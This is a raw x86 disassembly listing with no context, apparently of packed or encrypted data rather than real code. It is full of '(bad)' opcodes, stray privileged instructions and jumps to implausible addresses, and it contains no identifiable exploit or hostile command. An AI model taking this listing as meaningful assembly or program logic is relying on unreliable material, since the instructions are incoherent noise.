  41f3cd:	cmp    eax,DWORD PTR cs:[ebp+edx*1-0x23e176d6]
  41f3d5:	lock sub BYTE PTR [ebp+0x4c025d02],ah
  41f3dc:	loopne 0x41f3c4
  41f3de:	add    ch,bh
  41f3e0:	ret    0x67ff
  41f3e3:	into   
  41f3e4:	pop    edi
  41f3e5:	(bad)  
  41f3e6:	jmp    DWORD PTR [eax+0x47]
  41f3e9:	mov    ah,0xfc
  41f3eb:	dec    edi
  41f3ec:	pop    eax
  41f3ed:	icebp  
  41f3ee:	aas    
  41f3ef:	bound  eax,QWORD PTR ds:0x3e6b7245
  41f3f5:	add    BYTE PTR [esi],bl
  41f3f7:	inc    edx
  41f3f8:	add    edi,DWORD PTR [esi]
  41f3fa:	add    bh,BYTE PTR [ecx-0x16]
  41f3fd:	xchg   BYTE PTR [ebx],al
  41f3ff:	pop    ebp
  41f400:	dec    ebx
  41f401:	jno    0x41f38c
  41f403:	push   cs
  41f404:	pushf  
  41f405:	icebp  
  41f406:	call   0x52f3c4d6
  41f40b:	or     al,0xfb
  41f40d:	data16 mov BYTE PTR [ebx],ah
  41f410:	ficom  DWORD PTR [esi]
  41f412:	cmp    DWORD PTR [edx+0x88b26b],edx
  41f418:	leave  
  41f419:	mov    ebp,0xbda18af1
  41f41e:	stc    
  41f41f:	jle    0x41f469
  41f421:	out    dx,al
  41f422:	pushf  
  41f423:	mov    DWORD PTR [ecx-0x28],ebp
  41f426:	imul   ebx,DWORD PTR [ebx+0x4d],0x613debee
  41f42d:	mov    bl,0xfe
  41f42f:	push   0x1420595c
  41f434:	xchg   ebx,eax
  41f435:	fild   QWORD PTR [ecx+0x5b]
  41f438:	cmp    ch,ch
  41f43a:	in     al,dx
  41f43b:	or     DWORD PTR [esp+eax*8],0xffffff94
  41f43f:	clc    
  41f440:	jge    0x41f4b4
  41f442:	test   al,0xd0
  41f444:	pusha  
  41f445:	pop    ecx
  41f446:	add    BYTE PTR [ebx],bl
  41f448:	ja     0x41f414
  41f44a:	fs ret 
  41f44c:	shl    BYTE PTR [ebp+0x5960cce4],0xe0
  41f453:	mov    ah,0x50
  41f455:	fisubr WORD PTR [ecx+0x5a]
  41f458:	dec    ebx
  41f459:	jmp    0x41f454
  41f45b:	cmp    eax,0xbe04b361
  41f460:	call   0xc6adf832
  41f465:	lock call 0xe6c2186e
  41f46b:	mov    ebx,DWORD PTR [ecx-0x4d]
  41f46e:	pop    esi
  41f46f:	mov    edi,0xbe26c941
  41f474:	pop    edx
  41f475:	xchg   esi,eax
  41f476:	pop    ss
  41f477:	test   eax,0x3d3dda7
  41f47c:	add    BYTE PTR [edi],ah
  41f47e:	pusha  
  41f47f:	mov    ds:0x211018b5,eax
  41f484:	inc    edx
  41f485:	popa   
  41f486:	fst    DWORD PTR [esi]
  41f488:	scas   al,BYTE PTR es:[edi]
  41f489:	push   ss
  41f48a:	pusha  
  41f48b:	add    BYTE PTR [eax-0x61788d26],dl
  41f491:	dec    edx
  41f492:	fwait
  41f493:	jmp    DWORD PTR [edi+0x40e8cb25]
  41f499:	jns    0x41f50f
  41f49b:	sti    
  41f49c:	bound  esi,QWORD PTR [ecx+0x67d5f257]
  41f4a2:	or     ecx,DWORD PTR [eax-0x175f15e2]
  41f4a8:	leave  
  41f4a9:	xchg   esi,eax
  41f4aa:	jne    0x41f4a7
  41f4ac:	bound  esp,QWORD PTR [edi-0x7f]
  41f4af:	(bad)  
  41f4b0:	stc    
  41f4b1:	mov    eax,ds:0xa2c25b15
  41f4b6:	push   cs
  41f4b7:	mov    BYTE PTR [eax],bl
  41f4b9:	loop   0x41f4b0
  41f4bb:	or     al,0xe9
  41f4bd:	adc    eax,0x6597fbdb
  41f4c2:	jbe    0x41f4d9
  41f4c4:	leave  
  41f4c5:	icebp  
  41f4c6:	mov    bl,0x0
  41f4c8:	jb     0x41f471
  41f4ca:	push   ss
  41f4cb:	jmp    0xea96:0xfb736c0e
  41f4d2:	push   0xffffffe8
  41f4d4:	cmp    edx,DWORD PTR [ebx+0x73]
  41f4d7:	sti    
  41f4d8:	gs es call 0xed253416
  41f4df:	or     al,0x6a
  41f4e1:	add    BYTE PTR [eax-0x27],dl
  41f4e4:	je     0x41f4d7
  41f4e6:	adc    BYTE PTR [esi-0x367e2b05],ch
  41f4ec:	inc    eax
  41f4ed:	jmp    0xdd66e4ce
  41f4f2:	popa   
  41f4f3:	in     eax,dx
  41f4f4:	and    BYTE PTR [edi],bh
  41f4f6:	mov    ah,0x73
  41f4f8:	imul   ebp,ecx,0xe901c7a9
  41f4fe:	popa   
  41f4ff:	jbe    0x41f575
  41f501:	lds    ecx,FWORD PTR [ebp-0x23ffcc8c]
  41f507:	jno    0x41f520
  41f509:	adc    BYTE PTR [ebx],bh
  41f50b:	fnstsw WORD PTR [edi-0x40]
  41f50e:	data16 loope 0x41f52c
  41f511:	push   es
  41f512:	sbb    DWORD PTR [edi],edx
  41f514:	jmp    0x5b1ef01b
  41f519:	pop    edi
  41f51a:	jns    0x41f591
  41f51c:	sti    
  41f51d:	push   esp
  41f51e:	sar    cl,0x4a
  41f521:	push   ecx
  41f522:	enter  0x7a4,0x0
  41f526:	test   BYTE PTR [eax-0x28c4fb09],ah
  41f52c:	add    BYTE PTR [ebp+edx*2-0x6d],dh
  41f530:	sti    
  41f531:	mov    esi,es
  41f533:	and    cl,BYTE PTR [ebp+ecx*4-0x3a]
  41f537:	push   ds
  41f538:	dec    esp
  41f539:	push   0x12
  41f53b:	or     BYTE PTR [ebx+0xc],ch
  41f53e:	ins    BYTE PTR es:[edi],dx
  41f53f:	jo     0x41f554
  41f541:	adc    bl,cl
  41f543:	(bad)  
  41f544:	jg     0x41f506
  41f546:	add    BYTE PTR [edi-0x27],dh
  41f549:	cmp    DWORD PTR [ebp-0x11],0x80076fda
  41f550:	mov    al,ds:0x8ac4a8f3
  41f555:	add    DWORD PTR [ebx],esi
  41f557:	or     eax,DWORD PTR [esi]
  41f559:	and    edx,0xc1bedbc4
  41f55f:	mov    bl,0xdb
  41f561:	ret    
  41f562:	ret    
  41f563:	js     0x41f595
  41f565:	mov    cl,ch
  41f567:	xchg   ebx,eax
  41f568:	dec    esp
  41f569:	cld    
  41f56a:	(bad)  
  41f56b:	in     al,dx
  41f56c:	repz push edi
  41f56e:	and    al,0x8b
  41f570:	jecxz  0x41f54a
  41f572:	je     0x41f4fb
  41f574:	int3   
  41f575:	shr    bl,0x55
  41f578:	repnz inc edi
  41f57a:	and    al,0x7f
  41f57c:	xor    BYTE PTR [eax-0x30a79d2d],cl
  41f582:	daa    
  41f583:	arpl   WORD PTR [eax-0xd201086],ax
  41f589:	fadd   DWORD PTR [ebx]
  41f58b:	xor    BYTE PTR [eax+0x5a],al
  41f58e:	cmp    al,0xd7
  41f590:	iret   
  41f591:	dec    edi
  41f592:	add    BYTE PTR [ebx+ecx*8],dh
  41f595:	jnp    0x41f594
  41f597:	cdq    
  41f598:	push   cs
  41f599:	ror    DWORD PTR ds:0xc7d7dd8,cl
  41f59f:	fiadd  DWORD PTR [edx+0x366887c6]
  41f5a5:	or     bh,dl
  41f5a7:	mov    al,0xae
  41f5a9:	(bad)  
  41f5ab:	add    BYTE PTR [ebx+0x56724e80],bh
  41f5b1:	dec    edi
  41f5b2:	mov    ecx,0x4e7c97fc
  41f5b7:	adc    ch,BYTE PTR [esi+0x70]
  41f5ba:	mov    edi,0x4e97deff
  41f5bf:	hlt    
  41f5c0:	sub    DWORD PTR [esi+0x2a],esp
  41f5c3:	mov    BYTE PTR [edx+eiz*8],ch
  41f5c6:	inc    edx
  41f5c7:	out    0x1a,eax
  41f5c9:	mov    ds:0xbed80004,eax
  41f5ce:	scas   al,BYTE PTR es:[edi]
  41f5cf:	pop    ebp
  41f5d0:	xchg   DWORD PTR [edi+0x45],eax
  41f5d3:	or     esp,DWORD PTR [edx+0x1]
  41f5d6:	pop    esp
  41f5d7:	outs   dx,DWORD PTR ds:[esi]
  41f5d8:	pop    esp
  41f5d9:	cmp    bh,0x50
  41f5dc:	aaa    
  41f5dd:	stos   BYTE PTR es:[edi],al
  41f5de:	mov    ecx,0x84e3d68a
  41f5e3:	(bad)  
  41f5e4:	mov    ebp,0xcaf17c7f
  41f5e9:	cs pop ss
  41f5eb:	jmp    FWORD PTR [ebp+0x382388e6]
  41f5f1:	jle    0x41f5f2
  41f5f3:	(bad)  
  41f5f4:	jmp    0x5cc61efc
  41f5f9:	fldl2t 
  41f5fb:	add    edx,DWORD PTR [ecx-0x5a]
  41f5fe:	xor    bl,0x86
  41f601:	pop    ebp
  41f602:	mov    edx,0x255faf7d
  41f607:	sub    BYTE PTR [edx-0x7f],bl
  41f60a:	nop
  41f60b:	sub    DWORD PTR [ebp+0x71],ebp
  41f60e:	outs   dx,BYTE PTR ds:[esi]
  41f60f:	pop    esp
  41f610:	add    al,ah
  41f612:	and    edx,0xffffff87
  41f615:	rcr    dl,1
  41f617:	jmp    0x7548a51f
  41f61c:	add    BYTE PTR [ecx+0x6203e961],0x81
  41f623:	pop    eax
  41f624:	and    BYTE PTR ds:0x81805c71,bh
  41f62a:	stos   DWORD PTR es:[edi],eax
  41f62b:	out    0x3,eax
  41f62d:	bound  eax,QWORD PTR [ecx+0x7125ed9c]
  41f633:	imul   BYTE PTR [eax+eiz*8]
  41f636:	cdq    
  41f637:	mov    cl,0xc1
  41f639:	mov    eax,ebp
  41f63b:	je     0x41f5fd
  41f63d:	inc    ecx
  41f63e:	mov    ecx,0x55d8b3b8
  41f643:	int    0x11
  41f645:	pusha  
  41f646:	fldl2t 
  41f648:	mov    bl,0x92
  41f64a:	or     al,0x3
  41f64c:	div    ebp
  41f64e:	retf   0x3a9
  41f651:	loope  0x41f5ec
  41f653:	jae    0x41f66a
  41f655:	inc    esp
  41f656:	mov    dl,0x8d
  41f658:	(bad)  
  41f659:	jnp    0x41f640
  41f65b:	cmc    
  41f65c:	test   ch,dl
  41f65e:	lds    ebx,FWORD PTR [edx+ebp*1-0x6d]
  41f662:	mov    ds:0x15297b4b,al
  41f667:	out    dx,al
  41f668:	jle    0x41f68b
  41f66a:	mov    ch,0xe5
  41f66c:	mov    bl,0xeb
  41f66e:	in     eax,dx
  41f66f:	dec    ebx
  41f670:	enter  0x5da5,0x0
  41f674:	add    BYTE PTR gs:[ebp-0x1b],al
  41f678:	(bad)  
  41f679:	call   0xb25077df
  41f67e:	xor    ebp,DWORD PTR [ebp-0x7b]
  41f681:	test   eax,0x6dc04c62
  41f686:	and    ebx,ebp
  41f688:	push   es
  41f689:	fisub  DWORD PTR [ecx]
  41f68b:	test   BYTE PTR [ecx-0x116ba93],0xe8
  41f692:	popa   
  41f693:	fs test ch,cl
  41f696:	xor    edx,ebx
  41f698:	add    cl,ch
  41f69a:	adc    DWORD PTR [ebp+0x15],ebp
  41f69d:	xor    eax,0x6c00b056
  41f6a2:	or     eax,0xf5c344bc
  41f6a7:	push   es
  41f6a8:	jmp    0xfbb06f77
  41f6ad:	cli    
  41f6ae:	mov    eax,ds:0x7d9d88b0
  41f6b3:	retf   0xad89
  41f6b6:	inc    ebp
  41f6b7:	(bad)  
  41f6ba:	cmp    eax,0x257450d1
  41f6bf:	mov    esp,0x1c84b94c
  41f6c4:	and    eax,0x50cc1f8d
  41f6c9:	add    edi,edx
  41f6cb:	pop    ecx
  41f6cc:	add    ecx,ebp
  41f6ce:	out    0x9b,al
  41f6d0:	adc    al,0x6a
  41f6d2:	cdq    
  41f6d3:	ins    DWORD PTR es:[edi],dx
  41f6d4:	or     ebp,DWORD PTR [ebp-0x8]
  41f6d7:	outs   dx,DWORD PTR ds:[esi]
  41f6d8:	sti    
  41f6d9:	jmp    0x255e4ade
  41f6de:	inc    ecx
  41f6df:	push   ss
  41f6e0:	arpl   WORD PTR [ebp+eax*1-0x16ff2656],dx
  41f6e7:	loop   0x41f74c
  41f6e9:	and    al,0x4d
  41f6eb:	push   0xffffffd9
  41f6ed:	add    BYTE PTR [eax],al
  41f6ef:	xchg   ebx,eax
  41f6f0:	xor    al,0xc9
  41f6f2:	(bad)  
  41f6f3:	in     al,0x61
  41f6f5:	mov    ebx,0xfbee0f0f
  41f6fa:	dec    DWORD PTR [ebx+0x7b80632a]
  41f700:	fild   DWORD PTR [eax]
  41f702:	push   0x7a
  41f704:	sub    dl,BYTE PTR [eax+0x68]
  41f707:	mov    ebx,ebx
  41f709:	add    al,al
  41f70b:	push   ss
  41f70c:	popa   
  41f70d:	pop    ds
  41f70e:	nop
  41f70f:	jg     0x41f6ec
  41f711:	add    BYTE PTR [eax-0x1c],dl
  41f714:	jno    0x41f6f5
  41f716:	adc    cl,BYTE PTR [ebx-0x370f762b]
  41f71c:	pop    ds
  41f71d:	std    
  41f71e:	jne    0x41f77a
  41f720:	push   ds
  41f721:	cmove  ecx,DWORD PTR [ecx-0x65]
  41f725:	sti    
  41f726:	adc    BYTE PTR [ebx-0x3fa591db],0xa1
  41f72d:	pop    ds
  41f72e:	adc    al,0xfb
  41f730:	in     eax,dx
  41f731:	aas    
  41f732:	and    al,0xf
  41f734:	retf   0x3e8
  41f737:	or     ebx,ebx
  41f739:	or     eax,0xfd1fd082
  41f73e:	inc    DWORD PTR [eax]
  41f740:	jo     0x41f6e3
  41f742:	push   eax
  41f743:	lea    edi,[edi-0x43afe74a]
  41f749:	xor    DWORD PTR [ebp-0x1],edx
  41f74c:	out    dx,al
  41f74d:	ret    0x4011
  41f750:	sti    
  41f751:	popa   
  41f752:	mov    ebx,0x4014f074
  41f757:	and    al,0xb8
  41f759:	aad    0x33
  41f75b:	jl     0x41f6fc
  41f75d:	outs   dx,WORD PTR ds:[esi]
  41f75f:	add    al,0x53
  41f761:	ds pop ds
  41f763:	adc    ecx,DWORD PTR [ebp+0x62140f1e]
  41f769:	jae    0x41f72a
  41f76b:	dec    DWORD PTR [edi]
  41f76d:	lahf   
  41f76e:	clc    
  41f76f:	xchg   edi,eax
  41f770:	push   eax
  41f771:	rol    BYTE PTR [edx+ecx*4],0x1e
  41f775:	aam    0xef
  41f777:	and    DWORD PTR [edx-0x1974ff53],0xffffffd4
  41f77e:	int3   
  41f77f:	add    esp,DWORD PTR [edx-0x80]
  41f782:	push   edi
  41f783:	shl    ah,cl
  41f785:	cmp    bh,0x88
  41f788:	scas   eax,DWORD PTR es:[edi]
  41f789:	pop    eax
  41f78a:	in     eax,dx
  41f78b:	and    eax,0x43798063
  41f790:	inc    esi
  41f791:	xchg   ebx,eax
  41f792:	push   esi
  41f793:	add    esi,DWORD PTR [ecx]
  41f795:	cmp    edi,DWORD PTR [ecx-0x40]
  41f798:	sbb    BYTE PTR [esi+0x4],dl
  41f79b:	add    BYTE PTR [edx+0xd],ah
  41f79e:	jl     0x41f7c3
  41f7a0:	loop   0x41f821
  41f7a2:	(bad)  
  41f7a3:	inc    DWORD PTR [eax]
  41f7a5:	fcmovu st,st(0)
  41f7a7:	lds    ecx,FWORD PTR [ecx-0x49]
  41f7aa:	or     ch,BYTE PTR [ebx-0x7bd468a3]
  41f7b0:	ret    
  41f7b1:	mov    dl,0x7e
  41f7b3:	(bad)  
  41f7b4:	jmp    DWORD PTR [eax]
  41f7b6:	je     0x41f7b7
  41f7b8:	jle    0x41f7c8
  41f7ba:	mov    ah,0xf7
  41f7bc:	call   DWORD PTR ds:0xb555b853
  41f7c2:	in     eax,0x7b
  41f7c4:	and    ebx,edx
  41f7c6:	jg     0x41f7c7
  41f7c8:	(bad)  
  41f7c9:	jmp    0x41f7f6
  41f7cb:	and    ebx,DWORD PTR [edx+ecx*1]
  41f7ce:	addr16 pop ss
  41f7d0:	(bad)  
  41f7d1:	in     eax,dx
  41f7d2:	in     al,0x7b
  41f7d4:	and    ebp,DWORD PTR [eax]
  41f7d6:	cmp    bh,0xff
  41f7d9:	retf   0xe7a8
  41f7dc:	call   ebp
  41f7de:	xor    ah,BYTE PTR [esi]
  41f7e0:	and    BYTE PTR [edx+0x3bbe61d8],0xc5
  41f7e7:	ins    BYTE PTR es:[edi],dx
  41f7e8:	rol    BYTE PTR [ecx-0x174bc753],0x54
  41f7ef:	add    eax,0xe9d963c6
  41f7f4:	mov    bl,0x12
  41f7f6:	or     bh,BYTE PTR [ebx+0x29c795f7]
  41f7fc:	add    al,0xe1
  41f7fe:	cwde   
  41f7ff:	sub    edx,DWORD PTR [edx]
  41f801:	add    al,0xb0
  41f803:	inc    ebp
  41f804:	enter  0xe54f,0xed
  41f808:	add    BYTE PTR [eax],0x75
  41f80b:	les    edx,FWORD PTR [esi+eiz*1]
  41f80e:	xor    esp,DWORD PTR [eax+0x15197b03]
  41f814:	ret    0x217e
  41f817:	mov    ch,0xc1
  41f819:	mov    bl,0x1b
  41f81b:	out    dx,al
  41f81c:	add    ecx,eax
  41f81e:	push   ebp
  41f81f:	pop    esi
  41f820:	pop    ebp
  41f821:	sub    dh,cl
  41f823:	xlat   BYTE PTR ds:[ebx]
  41f824:	jmp    0x313e322c
  41f829:	dec    esi
  41f82a:	ds push edi
  41f82c:	sub    ebp,edi
  41f82e:	rcr    BYTE PTR [ecx-0x204fbb9b],1
  41f834:	test   BYTE PTR [ebx-0x41],0x62
  41f838:	sub    BYTE PTR gs:[edx-0x16fc1629],bl
  41f83f:	push   ebp
  41f840:	add    eax,0xe9d963cc
  41f845:	mov    bl,0x6
  41f847:	(bad)  
  41f848:	sub    eax,0x5ed93df1
  41f84d:	cwde   
  41f84e:	inc    ecx
  41f84f:	out    0xe7,eax
  41f851:	add    esp,DWORD PTR [edx-0x1]
  41f854:	pushf  
  41f855:	jle    0x41f7e8
  41f857:	mov    ch,0xcd
  41f859:	stos   BYTE PTR es:[edi],al
  41f85a:	lds    esi,FWORD PTR [ecx]
  41f85c:	add    BYTE PTR [esi],ch
  41f85e:	and    al,0x6d
  41f860:	xor    edi,0xe6114472
  41f866:	punpcklbw mm0,DWORD PTR [ebp+eax*1-0x7e]
  41f86b:	or     DWORD PTR [esi+0x18a002d],ecx
  41f871:	addr16 cmc 
  41f873:	icebp  
  41f874:	je     0x41f87e
  41f876:	push   0xa57fd960
  41f87b:	xchg   ecx,eax
  41f87c:	pop    ecx
  41f87d:	clc    
  41f87e:	mov    dh,0x96
  41f880:	pop    eax
  41f881:	(bad)  
  41f882:	call   0x2dcfd1e8
  41f887:	cmp    bh,cl
  41f889:	push   eax
  41f88a:	ins    BYTE PTR es:[edi],dx
  41f88b:	cmc    
  41f88c:	mov    bh,0x7c
  41f88e:	jmp    0x41f8f1
  41f890:	(bad)  [ebp+0x455455d]
  41f896:	jmp    0xb23c79fc
  41f89b:	scas   eax,DWORD PTR es:[edi]
  41f89c:	ins    DWORD PTR es:[edi],dx
  41f89d:	test   DWORD PTR [ecx-0x1792a7aa],ebp
  41f8a3:	popa   
  41f8a4:	(bad)  [ebp+0x2617d6d]
  41f8aa:	jmp    0x6dd00210
  41f8af:	jge    0x41f906
  41f8b1:	add    al,0xe9
  41f8b3:	popa   
  41f8b4:	or     esp,edi
  41f8b6:	fsub   QWORD PTR [ebp-0x36]
  41f8b9:	inc    eax
  41f8ba:	jmp    0x32c96d59
  41f8bf:	loop   0x41f92f
  41f8c1:	sti    
  41f8c2:	fsubrp st(5),st
  41f8c4:	pop    ds
  41f8c5:	add    ch,cl
  41f8c7:	popa   
  41f8c8:	pop    edx
  41f8c9:	dec    esp
  41f8ca:	lds    ecx,FWORD PTR [ecx]
  41f8cc:	ins    DWORD PTR es:[edi],dx
  41f8cd:	lea    ebp,[ebp+0x3d]
  41f8d0:	and    eax,0x6100e902
  41f8d5:	or     DWORD PTR [esi+0x7cb48700],ecx
  41f8db:	add    cl,bl
  41f8dd:	xlat   BYTE PTR ds:[ebx]
  41f8de:	xchg   DWORD PTR [edi+eiz*4-0x440000ad],ecx
  41f8e5:	cmpxchg eax,ecx
  41f8e8:	mov    ebp,0xccc07f1f
  41f8ed:	jmp    0x41f8cc
  41f8ef:	add    bl,cl
  41f8f1:	xlat   BYTE PTR ds:[ebx]
  41f8f2:	push   0xd7bb80
  41f8f7:	push   0xffffffb8
  41f8f9:	lea    eax,[eax]
  41f8fb:	push   0x8000d78b
  41f900:	(bad)  
  41f901:	pop    eax
  41f902:	pop    ds
  41f903:	nop
  41f904:	xchg   edi,edx
  41f906:	add    BYTE PTR [eax+0xe],dl
  41f909:	xor    DWORD PTR [edi],ebx
  41f90b:	sub    al,0xd3
  41f90d:	aas    
  41f90e:	bound  eax,QWORD PTR [ecx]
  41f910:	mov    ebp,ebx
  41f912:	mov    ebx,0xfb48070f
  41f917:	(bad)  
  41f918:	jnp    0x41f90a
  41f91a:	aas    
  41f91b:	and    al,0x2b
  41f91d:	daa    
  41f91e:	xchg   BYTE PTR [edi+eiz*1+0x73],cl
  41f922:	sbb    DWORD PTR [edi+eiz*1+0x7c],0xffffffe3
  41f927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f928:	xor    dl,dh
  41f92a:	add    BYTE PTR [ebx+ecx*4+0x4bc87f6e],al
  41f931:	xlat   BYTE PTR ds:[ebx]
  41f932:	add    BYTE PTR [ebx-0x74df34e9],cl
  41f938:	add    BYTE PTR [ebp+0x6a],dh
  41f93b:	aas    
  41f93c:	and    al,0x67
  41f93e:	outs   dx,BYTE PTR ds:[esi]
  41f93f:	jg     0x41f8f9
  41f941:	or     edx,edi
  41f943:	add    BYTE PTR [ecx],bh
  41f945:	(bad)  
  41f947:	and    al,0xf
  41f949:	je     0x41f99a
  41f94b:	sti    
  41f94c:	dec    DWORD PTR [ebx]
  41f94e:	test   DWORD PTR [edi],eax
  41f950:	and    DWORD PTR [edx-0x3e],0x80c20004
  41f957:	test   BYTE PTR [edx+eax*8-0x10000080],0x3a
  41f95f:	add    eax,0xb7ecab83
  41f964:	out    0x80,eax
  41f966:	xchg   esp,eax
  41f967:	add    al,0x0
  41f969:	fstp   DWORD PTR [eax-0x48c92780]
  41f96f:	xor    ebp,0x54dd753b
  41f975:	lods   eax,DWORD PTR ds:[esi]
  41f976:	gs mov bh,0x11
  41f979:	and    al,BYTE PTR [eax-0x7862387e]
  41f97f:	cli    
  41f980:	push   ebp
  41f981:	xor    ebp,esi
  41f983:	mov    bl,0x23
  41f985:	inc    edx
  41f986:	cwde   
  41f987:	cmp    al,0x66
  41f989:	arpl   WORD PTR [eax-0x2b0839f6],ax
  41f98f:	scas   al,BYTE PTR es:[edi]
  41f990:	push   eax
  41f991:	out    0xf4,eax
  41f993:	sbb    edx,DWORD PTR [eax-0x18007f9e]
  41f999:	fmul   DWORD PTR [ecx-0x16fffffc]
  41f99f:	mov    bl,0x20
  41f9a1:	sbb    al,0xe9
  41f9a3:	out    0x7c,al
  41f9a5:	das    
  41f9a6:	and    al,0xb4
  41f9a8:	and    BYTE PTR ds:0xfc2bcf63,dl
  41f9ae:	mov    dh,0xd4
  41f9b0:	in     al,dx
  41f9b1:	cld    
  41f9b2:	dec    edi
  41f9b3:	call   0xffa439ad
  41f9b8:	mov    bl,0x23
  41f9ba:	dec    edx
  41f9bb:	adc    eax,DWORD PTR [eax-0x7cb985]
  41f9c1:	jae    0x41fa29
  41f9c3:	cmc    
  41f9c4:	jae    0x41f9e9
  41f9c6:	loop   0x41fa3b
  41f9c8:	(bad)  
  41f9c9:	(bad)  
  41f9ca:	cli    
  41f9cb:	fdivr  DWORD PTR [edx-0x29]
  41f9ce:	cld    
  41f9cf:	imul   esp,DWORD PTR [edx+ecx*2+0x70],0x41b764a7
  41f9d7:	rol    DWORD PTR [ecx],1
  41f9d9:	jg     0x41fa58
  41f9db:	fsubr  st,st(1)
  41f9dd:	js     0x41f9c0
  41f9df:	mov    ah,0x71
  41f9e1:	add    DWORD PTR [edx-0x27],esp
  41f9e4:	cdq    
  41f9e5:	mov    al,0xce
  41f9e7:	ret    
  41f9e8:	icebp  
  41f9e9:	hlt    
  41f9ea:	test   ecx,ebx
  41f9ec:	ins    BYTE PTR es:[edi],dx
  41f9ed:	inc    esp
  41f9ee:	outs   dx,BYTE PTR ds:[esi]
  41f9ef:	push   esp
  41f9f0:	mov    edi,0xbe69b64a
  41f9f5:	jmp    0x41f9d1
  41f9f7:	popf   
  41f9f8:	ror    DWORD PTR [esi+0x5ce9d882],0xc8
  41f9ff:	xchg   edx,eax
  41fa00:	and    eax,0xd86f0020
  41fa05:	mov    esi,0x61cd89c
  41fa0a:	in     al,dx
  41fa0b:	jge    0x41fa13
  41fa0d:	adc    al,BYTE PTR [ebx]
  41fa0f:	bound  eax,QWORD PTR [ebx+ebx*4]
  41fa12:	out    dx,eax
  41fa13:	test   esi,eax
  41fa15:	sub    DWORD PTR [ebx+edi*2],eax
  41fa18:	(bad)  
  41fa19:	pop    esi
  41fa1a:	dec    ebp
  41fa1b:	stos   DWORD PTR es:[edi],eax
  41fa1c:	jp     0x41fa06
  41fa1e:	add    esp,DWORD PTR [edx+0x56]
  41fa21:	ins    DWORD PTR es:[edi],dx
  41fa22:	and    dl,ch
  41fa24:	fldl2t 
  41fa26:	add    ebx,edx
  41fa28:	ret    0xbe28
  41fa2b:	shl    BYTE PTR [ebx+0x6e],1
  41fa2e:	inc    ecx
  41fa2f:	sahf   
  41fa30:	pop    es
  41fa31:	mov    ebp,0x259db4ac
  41fa36:	cld    
  41fa37:	sub    eax,0x24942669
  41fa3c:	fwait
  41fa3d:	cmc    
  41fa3e:	add    edx,DWORD PTR [esi+ebx*1]
  41fa41:	push   es
  41fa42:	add    BYTE PTR ds:0xb162010f,dl
  41fa48:	popf   
  41fa49:	add    cl,BYTE PTR ds:0x9d00a8be
  41fa4f:	cld    
  41fa50:	and    BYTE PTR [edx+ecx*8+0x60],0xd9
  41fa55:	xchg   DWORD PTR [edi],ebp
  41fa57:	mov    eax,0x89e9049a
  41fa5c:	push   eax
  41fa5d:	jecxz  0x41fa48
  41fa5f:	popa   
  41fa60:	sub    DWORD PTR [ecx],eax
  41fa62:	sub    dh,BYTE PTR [eax]
  41fa64:	sbb    al,0x25
  41fa66:	in     eax,dx
  41fa67:	add    BYTE PTR [eax+0xf],ah
  41fa6a:	mov    al,bh
  41fa6c:	and    bl,dh
  41fa6e:	or     BYTE PTR [ebp-0x1b90975f],cl
  41fa74:	sbb    DWORD PTR [edi+0x5261e81f],esp
  41fa7a:	ret    0x1c2f
  41fa7d:	fadd   QWORD PTR [eax]
  41fa7f:	push   0xe9082835
  41fa84:	popa   
  41fa85:	or     dl,BYTE PTR [esi+0x1f]
  41fa88:	shl    edx,cl
  41fa8a:	pop    ecx
  41fa8b:	bound  ebp,QWORD PTR [edi]
  41fa8d:	push   ecx
  41fa8e:	stc    
  41fa8f:	je     0x41fa9e
  41fa91:	mov    esp,0xd961e994
  41fa96:	pop    ecx
  41fa97:	sbb    DWORD PTR [ebx-0x64],0x5bec8efa
  41fa9e:	and    al,0x59
  41faa0:	popa   
  41faa1:	fld    DWORD PTR [eax]
  41faa3:	jle    0x41fa8a
  41faa5:	mov    ebx,0xd961e1d4
  41faaa:	xchg   DWORD PTR [esi-0x46c20ded],ebx
  41fab0:	cdq    
  41fab1:	xchg   ebx,eax
  41fab2:	xor    eax,ebp
  41fab4:	popa   
  41fab5:	pop    ebp
  41fab6:	rcr    ch,0xf5
  41fab9:	icebp  
  41faba:	add    DWORD PTR [ebp+ebp*8-0x45],ebx
  41fabe:	inc    esp
  41fabf:	add    BYTE PTR [ebx+0xb00e53a],dh
  41fac5:	push   ebp
  41fac6:	or     esp,DWORD PTR [edi]
  41fac8:	sti    
  41fac9:	(bad)  
  41facb:	mov    ah,0x0
  41facd:	pop    edi
  41face:	test   eax,0xef0b0003
  41fad3:	aas    
  41fad4:	and    al,0x63
  41fad6:	cs dec ebx
  41fad8:	push   0x1a
  41fada:	in     eax,0xcc
  41fadc:	(bad)  
  41fadd:	mov    edi,0x2bb450c7
  41fae2:	pushf  
  41fae3:	sti    
  41fae4:	out    0x24,eax
  41fae6:	into   
  41fae7:	sti    
  41fae8:	(bad)  
  41fae9:	ds sbb al,0x6f
  41faec:	sbb    dh,BYTE PTR [esi-0x24]
  41faef:	or     BYTE PTR [eax],al
  41faf1:	retf   
  41faf2:	adc    eax,0xbbaf2440
  41faf7:	outs   dx,DWORD PTR ds:[esi]
  41faf8:	push   cs
  41faf9:	lea    ebx,[eax-0x6845ebe1]
  41faff:	and    DWORD PTR fs:[edi],0xffffffb9
  41fb03:	sbb    BYTE PTR [eax],al
  41fb05:	dec    edi
  41fb06:	(bad)  
  41fb07:	shl    BYTE PTR cs:[edi+edi*1+0x56],0x5b
  41fb0d:	cli    
  41fb0e:	sbb    BYTE PTR [eax+ecx*1+0x4bedb8b],bh
  41fb15:	mov    esi,DWORD PTR ds:0xb79f8486
  41fb1b:	sti    
  41fb1c:	(bad)  
  41fb1d:	jnp    0x41fb4a
  41fb1f:	xchg   BYTE PTR [edi+ebp*1-0x6d],dl
  41fb23:	xchg   BYTE PTR [edi+ebx*1+0x33],cl
  41fb27:	jecxz  0x41faab
  41fb29:	jp     0x41fb07
  41fb2b:	add    BYTE PTR [ebx],bh
  41fb2d:	std    
  41fb2e:	mov    ah,dl
  41fb30:	mov    al,BYTE PTR [eax]
  41fb32:	xsavec [ebp+0x24]
  41fb36:	adc    al,0x97
  41fb38:	(bad)  
  41fb39:	cmp    esp,DWORD PTR [edx+0x6b]
  41fb3c:	ror    al,1
  41fb3e:	imul   cx,bx,0x44
  41fb42:	jmp    0xe6ccabbe
  41fb47:	fdiv   QWORD PTR [eax]
  41fb49:	dec    DWORD PTR ds:0x1588b471
  41fb4f:	mov    eax,0xc0e903b4
  41fb54:	xor    ebp,0x1243b07b
  41fb5a:	push   ds
  41fb5b:	mov    di,0x26ff
  41fb5f:	sbb    DWORD PTR [edx],0x0
  41fb62:	(bad)  
